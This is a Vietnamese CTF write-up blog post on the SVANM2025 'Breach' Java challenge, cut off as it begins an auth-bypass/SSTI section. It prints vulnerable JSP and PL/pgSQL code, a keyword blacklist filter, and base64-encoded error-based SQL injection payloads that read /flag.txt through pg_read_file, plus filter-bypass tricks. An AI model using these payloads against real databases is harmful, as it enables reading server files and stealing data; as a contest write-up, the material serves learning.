<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="M√¨nh nghƒ© c≈©ng ph·∫£i 8 th√°ng sau b√†i wu g·∫ßn nh·∫•t, kh√¥ng ph·∫£i l√† do m√¨nh kh√¥ng ch∆°i n·ªØa, m√† l√† do m√¨nh l∆∞·ªùi. M√£i sau khi thi xong SVANM, m√¨nh m·ªõi th·∫•y l√† m√¨nh n√™n t·∫≠p t√†nh vi·∫øt tr·ªü l·∫°i, n√™n ƒë√¢y s·∫Ω l√† h√†nh tr√¨nh thi trong 8 ti·∫øng c·ªßa m√¨nh h∆°n l√† m·ªôt writeup thu·∫ßn t√∫y.\nL√† m·ªôt sinh vi√™n nƒÉm 4(.5) chu·∫©n b·ªã ra tr∆∞·ªùng may m·∫Øn ƒë∆∞·ª£c l·ª±a ch·ªçn ƒë·ªÉ ƒëi thi Sinh Vi√™n An Ninh M·∫°ng, ti·ªÅn th√¢n l√† Sinh Vi√™n v·ªõi An To√†n Th√¥ng tin. Cho n√™n ƒë√¢y l√† l·∫ßn ƒë·∫ßu c≈©ng l√† l·∫ßn cu·ªëi m√¨nh c√≥ th·ªÉ tham gia cu·ªôc thi n√†y.\n"><title>SVANM2025: The End Of Beginning</title><link rel=canonical href=https://kev1n1203.github.io/p/svanm-2025/><link rel=stylesheet href=/scss/style.min.43579eb5b8b82fae543c237cb1e0ed21184587621bafe6e42941bbb438644f4a.css><meta property='og:title' content="SVANM2025: The End Of Beginning"><meta property='og:description' content="M√¨nh nghƒ© c≈©ng ph·∫£i 8 th√°ng sau b√†i wu g·∫ßn nh·∫•t, kh√¥ng ph·∫£i l√† do m√¨nh kh√¥ng ch∆°i n·ªØa, m√† l√† do m√¨nh l∆∞·ªùi. M√£i sau khi thi xong SVANM, m√¨nh m·ªõi th·∫•y l√† m√¨nh n√™n t·∫≠p t√†nh vi·∫øt tr·ªü l·∫°i, n√™n ƒë√¢y s·∫Ω l√† h√†nh tr√¨nh thi trong 8 ti·∫øng c·ªßa m√¨nh h∆°n l√† m·ªôt writeup thu·∫ßn t√∫y.\nL√† m·ªôt sinh vi√™n nƒÉm 4(.5) chu·∫©n b·ªã ra tr∆∞·ªùng may m·∫Øn ƒë∆∞·ª£c l·ª±a ch·ªçn ƒë·ªÉ ƒëi thi Sinh Vi√™n An Ninh M·∫°ng, ti·ªÅn th√¢n l√† Sinh Vi√™n v·ªõi An To√†n Th√¥ng tin. Cho n√™n ƒë√¢y l√† l·∫ßn ƒë·∫ßu c≈©ng l√† l·∫ßn cu·ªëi m√¨nh c√≥ th·ªÉ tham gia cu·ªôc thi n√†y.\n"><meta property='og:url' content='https://kev1n1203.github.io/p/svanm-2025/'><meta property='og:site_name' content="kev1n's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='CTF'><meta property='article:published_time' content='2025-11-16T17:28:53+00:00'><meta property='article:modified_time' content='2025-11-16T17:28:53+00:00'><meta name=twitter:title content="SVANM2025: The End Of Beginning"><meta name=twitter:description content="M√¨nh nghƒ© c≈©ng ph·∫£i 8 th√°ng sau b√†i wu g·∫ßn nh·∫•t, kh√¥ng ph·∫£i l√† do m√¨nh kh√¥ng ch∆°i n·ªØa, m√† l√† do m√¨nh l∆∞·ªùi. M√£i sau khi thi xong SVANM, m√¨nh m·ªõi th·∫•y l√† m√¨nh n√™n t·∫≠p t√†nh vi·∫øt tr·ªü l·∫°i, n√™n ƒë√¢y s·∫Ω l√† h√†nh tr√¨nh thi trong 8 ti·∫øng c·ªßa m√¨nh h∆°n l√† m·ªôt writeup thu·∫ßn t√∫y.\nL√† m·ªôt sinh vi√™n nƒÉm 4(.5) chu·∫©n b·ªã ra tr∆∞·ªùng may m·∫Øn ƒë∆∞·ª£c l·ª±a ch·ªçn ƒë·ªÉ ƒëi thi Sinh Vi√™n An Ninh M·∫°ng, ti·ªÅn th√¢n l√† Sinh Vi√™n v·ªõi An To√†n Th√¥ng tin. Cho n√™n ƒë√¢y l√† l·∫ßn ƒë·∫ßu c≈©ng l√† l·∫ßn cu·ªëi m√¨nh c√≥ th·ªÉ tham gia cu·ªôc thi n√†y.\n"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_80bb896afdf080a5.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>kev1n's Blog</a></h1><h2 class=site-description>Trung H·∫≠u - Th√†nh vi√™n ƒÉn h·∫°i t·∫°i KCSC</h2></div></header><ol class=menu-social><li><a href=https://github.com/kev1n1203 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://x.com/kev1n1203 target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#breach>Breach</a><ol><li><a href=#sql-injection-in-function>SQL Injection In Function</a></li><li><a href=#bypass-auth-to-ssti>Bypass Auth to SSTI</a><ol><li><a href=#bypass-authen>Bypass Authen</a></li><li><a href=#ssti-in-velocity>SSTI In Velocity</a></li></ol></li></ol></li><li><a href=#k·∫øt-th√∫c>K·∫øt th√∫c</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/p/svanm-2025/>SVANM2025: The End Of Beginning</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2025-11-16T17:28:53Z>Nov 16, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>12 minute read</time></div></footer></div></header><section class=article-content><p>M√¨nh nghƒ© c≈©ng ph·∫£i 8 th√°ng sau b√†i wu g·∫ßn nh·∫•t, kh√¥ng ph·∫£i l√† do m√¨nh kh√¥ng ch∆°i n·ªØa, m√† l√† do m√¨nh l∆∞·ªùi. M√£i sau khi thi xong SVANM, m√¨nh m·ªõi th·∫•y l√† m√¨nh n√™n t·∫≠p t√†nh vi·∫øt tr·ªü l·∫°i, n√™n ƒë√¢y s·∫Ω l√† h√†nh tr√¨nh thi trong 8 ti·∫øng c·ªßa m√¨nh h∆°n l√† m·ªôt writeup thu·∫ßn t√∫y.</p><p>L√† m·ªôt sinh vi√™n nƒÉm 4(.5) chu·∫©n b·ªã ra tr∆∞·ªùng may m·∫Øn ƒë∆∞·ª£c l·ª±a ch·ªçn ƒë·ªÉ ƒëi thi Sinh Vi√™n An Ninh M·∫°ng, ti·ªÅn th√¢n l√† Sinh Vi√™n v·ªõi An To√†n Th√¥ng tin. Cho n√™n ƒë√¢y l√† l·∫ßn ƒë·∫ßu c≈©ng l√† l·∫ßn cu·ªëi m√¨nh c√≥ th·ªÉ tham gia cu·ªôc thi n√†y.</p><p>ƒêi·ªÅu ƒë·∫∑c bi·ªát l√† chung kh·∫£o nƒÉm nay l√† kh√¥ng thi theo ki·ªÉu Attack-Defend truy·ªÅn th·ªëng m√† s·ª≠ d·ª•ng format nƒÉm 2020-2021: King Of The Hill. N√≥i n√¥m na th√¨ n√≥ l√† jeo, ai solve nhanh nh·∫•t s·∫Ω ƒë∆∞·ª£c ƒëi·ªÉm c·ªßa 1 round - 100 ƒëi·ªÉm. C√°c challenge c√≥ c√°c c√°ch patch kh√°c nhau, c√°c ƒë·ªôi c√≤n l·∫°i n·∫øu mu·ªën khai th√°c th√¨ s·∫Ω ph·∫£i ƒë·ª£i round sau ho·∫∑c unpatch ƒë·ªÉ attack.</p><p>Ph·∫ßn King of the Hill c√≥ 2 challenge web, m√¨nh nh√¨n th·∫•y challenge 1 c·∫ßn t√†i kho·∫£n Azure v√† review source code 1 h·ªìi th·∫•y khoai lang v√£o n√™n b·ªè lu√¥n üóø. Do ƒë√≥ m√¨nh ch·ªâ c√≤n 1 chall web ƒë·ªÉ gi√†nh gi·∫≠t ƒëi·ªÉm l√† challenge th·ª© 2: Breach</p><h2 id=breach>Breach</h2><p>M·ªôt challenge Java kh√¥ng outbound v·ªõi docker cho flag v√†o c·∫£ 2 service web l√† db, kh·∫£ nƒÉng s·∫Ω c√≥ 2 c√°ch ƒë·ªÉ l·∫•y flag:
<img src=https://hackmd.io/_uploads/S1cWtxdlZl.png loading=lazy alt=image><br></p><p>Author c≈©ng cung c·∫•p c√°ch ƒë·ªÉ patch challenge l√† s·∫Ω patch t·∫°i 2 file: patchme.groovy v√† patchme.jsp. C√°c file jsp s·∫Ω inlcude file patchme.jsp, t∆∞∆°ng t·ª± v·ªõi groovy:<br><img src=https://hackmd.io/_uploads/rkpdheOg-g.png loading=lazy alt=image><br><img src=https://hackmd.io/_uploads/Skoh2x_lZl.png loading=lazy alt=image><br></p><h3 id=sql-injection-in-function>SQL Injection In Function</h3><p>Ngay sau khi b·∫Øt ƒë·∫ßu cu·ªôc thi, m√¨nh v√† teammate ƒë√£ ng·ªìi v√†o l√†m lu√¥n challenge 2 v√† spot th·∫•y sql injection t·∫°i detail_services.jsp:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;%
</span></span><span class=line><span class=cl>  String service_name = request.getParameter(&#34;service_name&#34;);
</span></span><span class=line><span class=cl>  if(service_name == null) service_name = &#34;&#34;;
</span></span><span class=line><span class=cl>  if (!isSafeArgument(service_name)) {
</span></span><span class=line><span class=cl>    return;
</span></span><span class=line><span class=cl>  }
</span></span><span class=line><span class=cl>  PreparedStatement ps = null;
</span></span><span class=line><span class=cl>  ResultSet rs = null;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  try {
</span></span><span class=line><span class=cl>    String sql = &#34;SELECT * FROM get_service_details_dynamic(?)&#34;;
</span></span><span class=line><span class=cl>    ps = conn.prepareStatement(sql);
</span></span><span class=line><span class=cl>    ps.setString(1, service_name);
</span></span><span class=line><span class=cl>    rs = ps.executeQuery();
</span></span><span class=line><span class=cl>%&gt;
</span></span></code></pre></td></tr></table></div></div><p>Function get_service_details_dynamic ƒë∆∞·ª£c n·ªëi chu·ªói v√†o c√¢u l·ªánh SELECT, ngon ·ªìi:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>CREATE OR REPLACE FUNCTION get_service_details_dynamic(p_service_name VARCHAR)
</span></span><span class=line><span class=cl>RETURNS TABLE(
</span></span><span class=line><span class=cl>    service_name VARCHAR,
</span></span><span class=line><span class=cl>    feature VARCHAR,
</span></span><span class=line><span class=cl>    description TEXT
</span></span><span class=line><span class=cl>) AS $$
</span></span><span class=line><span class=cl>DECLARE
</span></span><span class=line><span class=cl>sql_query TEXT;
</span></span><span class=line><span class=cl>BEGIN
</span></span><span class=line><span class=cl>    -- Build the SQL string
</span></span><span class=line><span class=cl>    sql_query := &#39;SELECT s.name AS service_name, d.feature, d.description &#39; ||
</span></span><span class=line><span class=cl>                 &#39;FROM public.detail_services d &#39; ||
</span></span><span class=line><span class=cl>                 &#39;JOIN public.services s ON d.service_id = s.id &#39; ||
</span></span><span class=line><span class=cl>                 &#39;WHERE s.name ILIKE &#39;&#39;%&#39;||p_service_name||&#39;%&#39;&#39;&#39;;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    -- Execute the dynamic SQL and return results
</span></span><span class=line><span class=cl>RETURN QUERY EXECUTE sql_query;
</span></span><span class=line><span class=cl>END;
</span></span><span class=line><span class=cl>$$ LANGUAGE plpgsql;
</span></span></code></pre></td></tr></table></div></div><p>Th·∫≠t ra c√≤n 2 function n·ªëi chu·ªói n·ªØa trong source code, nh∆∞ng c√≥ 1 function kh√¥ng g·ªçi ƒë·∫øn, c√≤n 1 function nh·∫≠n ƒë·∫ßu v√†o l√† int n√™n m√¨nh c≈©ng kh√¥ng ƒë·ªÉ √Ω l·∫Øm m√† xem param n√†y b·ªã filter c√°i g√¨ t·∫°i <code>isSafeArgument(service_name)</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>private String[] blackLists = {&#34;pg_&#34;, &#34;chr&#34;, &#34;select&#34;, &#34;insert&#34;, &#34;update&#34;, &#34;copy&#34;, &#34;lo_&#34;, &#34;program&#34;, &#34;xml&#34;, &#34;;&#34;};
</span></span><span class=line><span class=cl>public boolean isSafeArgument(String input) {
</span></span><span class=line><span class=cl>    for (String keyword: blackLists) {
</span></span><span class=line><span class=cl>        if (input.toLowerCase().contains(keyword.toLowerCase())) {
</span></span><span class=line><span class=cl>            return false;
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    return true;
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>V·ªõi ki·ªÉu filter n√†y lowercase r·ªìi contains th√¨ kh√≥ ·ªìi =)), m√¨nh ng·ªìi loay hoay t√¨m trick 1 l√∫c kh√¥ng ra g√¨ th√¨ nh·ªõ l·∫°i trong ƒë·ªëng function ƒë∆∞·ª£c khai b√°o c√≥ 1 function kh√¥ng s·ª≠ d·ª•ng trong code:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>CREATE OR REPLACE FUNCTION sdecode(encoded TEXT)
</span></span><span class=line><span class=cl>RETURNS TEXT AS $$
</span></span><span class=line><span class=cl>DECLARE
</span></span><span class=line><span class=cl>sql_query TEXT;
</span></span><span class=line><span class=cl>    result TEXT;
</span></span><span class=line><span class=cl>BEGIN
</span></span><span class=line><span class=cl>    sql_query := &#39;SELECT convert_from(decode(&#39;&#39;&#39;||encoded||&#39;&#39;&#39;, &#39;&#39;base64&#39;&#39;), &#39;&#39;UTF8&#39;&#39;)&#39;;
</span></span><span class=line><span class=cl>EXECUTE sql_query INTO result;
</span></span><span class=line><span class=cl>RETURN result;
</span></span><span class=line><span class=cl>END;
</span></span><span class=line><span class=cl>$$ LANGUAGE plpgsql;
</span></span></code></pre></td></tr></table></div></div><p>Thay v√¨ l·ªç m·ªç ƒëi ki·∫øm trick bypass, m√¨nh s·∫Ω g·ªçi ƒë·∫øn sdecode ƒë·ªÉ sqli v√†o trong h√†m n√†y, v·ªõi √Ω t∆∞·ªüng l√† payload truy·ªÅn v√†o s·∫Ω ƒë∆∞·ª£c base64 xong r·ªìi m·ªõi ƒë∆∞a v√†o sdecode:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>it_db=# select convert_from(decode(&#39;UVE9PScsICdiYXNlNjQnKSwgJ1VURjgnKXx8Y2FzdCh2ZXJzaW9uKCkgYXMgbnVtZXJpYyktLQ==&#39;, &#39;base64&#39;), &#39;UTF8&#39;);
</span></span><span class=line><span class=cl>                      convert_from
</span></span><span class=line><span class=cl>---------------------------------------------------------
</span></span><span class=line><span class=cl> QQ==&#39;, &#39;base64&#39;), &#39;UTF8&#39;)||cast(version() as numeric)--
</span></span><span class=line><span class=cl>(1 row)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>it_db=# select sdecode(convert_from(decode(&#39;UVE9PScsICdiYXNlNjQnKSwgJ1VURjgnKXx8Y2FzdCh2ZXJzaW9uKCkgYXMgbnVtZXJpYyktLQ==&#39;, &#39;base64&#39;), &#39;UTF8&#39;));
</span></span><span class=line><span class=cl>ERROR:  invalid input syntax for type numeric: &#34;PostgreSQL 13.23 (Debian 13.23-1.pgdg13+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 14.2.0-19) 14.2.0, 64-bit&#34;
</span></span><span class=line><span class=cl>CONTEXT:  SQL statement &#34;SELECT convert_from(decode(&#39;QQ==&#39;, &#39;base64&#39;), &#39;UTF8&#39;)||cast(version() as numeric)--&#39;, &#39;base64&#39;), &#39;UTF8&#39;)&#34;
</span></span><span class=line><span class=cl>PL/pgSQL function sdecode(text) line 7 at EXECUTE
</span></span></code></pre></td></tr></table></div></div><p>V·ªõi vi·ªác flag n·∫±m ·ªü /flag.txt, m√¨nh ch·ªâ c·∫ßn thay version() th√†nh pg_read_file() l√† c√≥ th·ªÉ leak flag qua error based r·ªìi:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>it_db=# select sdecode(convert_from(decode(&#39;UVE9PScsICdiYXNlNjQnKSwgJ1VURjgnKXx8Y2FzdCgoc2VsZWN0IHBnX3JlYWRfZmlsZSgnL2ZsYWcudHh0JykpIGFzIG51bWVyaWMpLS0=&#39;, &#39;base64&#39;), &#39;UTF8&#39;));
</span></span><span class=line><span class=cl>ERROR:  invalid input syntax for type numeric: &#34;CSCV2025{fake_flag_for_testing}&#34;
</span></span><span class=line><span class=cl>CONTEXT:  SQL statement &#34;SELECT convert_from(decode(&#39;QQ==&#39;, &#39;base64&#39;), &#39;UTF8&#39;)||cast((select pg_read_file(&#39;/flag.txt&#39;)) as numeric)--&#39;, &#39;base64&#39;), &#39;UTF8&#39;)&#34;
</span></span><span class=line><span class=cl>PL/pgSQL function sdecode(text) line 7 at EXECUTE
</span></span></code></pre></td></tr></table></div></div><p>M√¨nh solve kh√° mu·ªôn, v·∫´n sau 2 team n√™n sau khi ra flag ·ªü challenge ph·∫£i gi√†nh gi·∫≠t submit m·∫•y round m·ªõi ƒÉn ƒë∆∞·ª£c 1 round:
<img src=https://hackmd.io/_uploads/Sk0M-W_ebl.png loading=lazy alt=image><br>C√°c round ƒë·∫ßu th√¨ c√°c v·∫´n ch∆∞a c√≥ patch n√†o, cho ƒë·∫øn khi m√¨nh nh√¨n m·∫∑t ƒë∆∞·ª£c payload v√† b·∫Øt ƒë·∫ßu patch chu·∫©n ch·ªâ th√¨ b·ªã 1 team unshield xong ƒë·ªõp c√°i patch. Th√†nh ra gi·ªù m√¨nh ph·∫£i bypass c√°i patch c·ªßa ch√≠nh m√¨nh, ho·∫∑c l√† ƒëi t√¨m bug kh√°c.
Trong l√∫c submit, m√¨nh v√† team m√¨nh li√™n t·ª•c submit ch·∫≠m h∆°n c√°c team kh√°c kh√¥ng ch·ªâ ·ªü category web m√† c√≤n ·ªü c√°c chall pwn. L√∫c th√¨ b·ªã rate limit, l√∫c th√¨ <code>owner already updated!!!</code> t·ª©c ƒë√£ c√≥ team kh√°c submit r·ªìi, ch·∫ßy ch·∫≠t m√£i m·ªõi c√≥ th·ªÉ gi√†nh l·∫°i ƒë∆∞·ª£c th√¨ c≈©ng kh√¥ng t·ªìn t·∫°i ƒë∆∞·ª£c qu√° 1 2 round. Team m√¨nh kh√° cay v√† ph·∫£i li√™n t·ª•c s·ª≠a script, th√™m sleep ƒë·ªÉ kh√¥ng b·ªã ratelimit nh∆∞ng v·∫´n kh√¥ng ƒÉn thua üóø
V·ªÅ sau, c√≥ m·ªôt s·ªë c√°ch patch m√† teammate m√¨nh ƒë√£ bypass nh∆∞:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=p>))</span> <span class=o>=&gt;</span> <span class=p>)</span><span class=o>/**/</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=s1>&#39; and v√† &#39;</span> <span class=ow>or</span> <span class=o>=&gt;</span> <span class=s1>&#39;||(payload)||&#39;</span>
</span></span><span class=line><span class=cl><span class=nb>convert</span> <span class=o>=&gt;</span> <span class=n>encode</span>
</span></span><span class=line><span class=cl><span class=s1>&#39;string&#39;</span> <span class=o>=&gt;</span> <span class=o>$$</span><span class=n>string</span><span class=o>$$</span>
</span></span><span class=line><span class=cl><span class=o>$$</span><span class=n>string</span><span class=o>$$</span> <span class=o>=&gt;</span> <span class=o>$</span><span class=n>quote</span><span class=o>$</span><span class=n>string</span><span class=o>$</span><span class=n>quote</span><span class=o>$</span>
</span></span></code></pre></td></tr></table></div></div><p>Ref: <a class=link href=https://hackmd.io/@Chivato/rkHvEMHUI target=_blank rel=noopener>https://hackmd.io/@Chivato/rkHvEMHUI</a>
T·∫°i nh·ªØng round cu·ªëi, khi b·∫£n patch ƒë√£ kh√° ch·∫∑t th√¨ ch·ªâ c√≤n team m√¨nh v√† 1 team kh√°c c√≥ th·ªÉ bypass patch n√™n 2 anh em c·ª© chia nhau m·ªói ng∆∞·ªùi 1 round. V√¨ m√¨nh kh√¥ng bi·∫øt payload c·ªßa h·ªç, c≈©ng nh∆∞ kh√¥ng mu·ªën ƒë·ªÉ l·ªô payload c·ªßa b·∫£n th√¢n n√™n m√¨nh ƒë√£ ch·ªçn s·ª≠ d·ª•ng l·∫°i b·∫£n patch m√† ch·ªâ 2 ƒë·ªôi c√≥ th·ªÉ bypass ƒë∆∞·ª£c, kh√° c·ªìng k·ªÅnh. V√† ƒë·∫øn g·∫ßn k·∫øt th√∫c cu·ªôc thi (ch·∫Øc c√≤n 3 round), m√¨nh m·ªõi h∆°i l·ªù m·ªù t√¨m ƒë∆∞·ª£c ƒë∆∞·ªùng ƒë·ªÉ exploit vuln th·ª© 2.</p><h3 id=bypass-auth-to-ssti>Bypass Auth to SSTI</h3><h4 id=bypass-authen>Bypass Authen</h4><p>ƒê·ªÉ ph√¢n t√≠ch ƒë∆∞·ª£c vuln n√†y th√¨ m√¨nh b·∫Øt bu·ªôc c·∫ßn ph·∫£i setup debug, m√¨nh ote l·∫°i m·ªôt v√†i b∆∞·ªõc nh∆∞ sau:</p><ul><li>Ch·ªânh l·∫°i Dockerfile c·ªßa tomcat</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
